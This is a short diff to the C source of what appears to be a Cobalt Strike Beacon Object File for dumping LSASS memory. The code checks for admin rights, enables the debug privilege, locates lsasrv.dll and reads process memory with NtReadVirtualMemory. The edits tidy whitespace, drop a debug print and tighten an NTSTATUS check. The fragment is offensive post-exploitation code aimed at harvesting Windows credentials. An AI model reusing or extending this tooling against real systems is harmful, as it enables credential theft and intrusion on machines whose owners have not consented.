@@ -301,7 +301,7 @@ void go(char* arg, int len) {
     SIZE_T mem64infolist_count = 0;
     void* lsasrvdll_address = NULL;
 
-    
+
 
     if(!BeaconIsAdmin())
     {
@@ -315,7 +315,7 @@ void go(char* arg, int len) {
     BeaconDataParse(&data, arg, len);
     char* filename;
     filename = BeaconDataExtract(&data, NULL);
-    BeaconPrintf(CALLBACK_OUTPUT, "Length of args: %d\n", len);
+
 
     if (!EnableDebugPriv()) {
          BeaconPrintf(CALLBACK_ERROR, "[*] Could not enable SE_DEBUG_PRIVILEGE. Error: 0x%08x\n", KERNEL32$GetLastError());
@@ -380,7 +380,7 @@ void go(char* arg, int len) {
 
             ULONG bytesRead = 0;
             status = NTDLL$NtReadVirtualMemory(hProc, mbi.BaseAddress, buffer, mbi.RegionSize, &bytesRead);
-            if (status != 0 && status != STATUS_PARTIAL_COPY) {
+            if (!NT_SUCCESS(status) && status != STATUS_PARTIAL_COPY) {
                  BeaconPrintf(CALLBACK_ERROR, "[-] Error calling NtReadVirtualMemory. NTSTATUS: 0x%08X\n", status);
             }
 
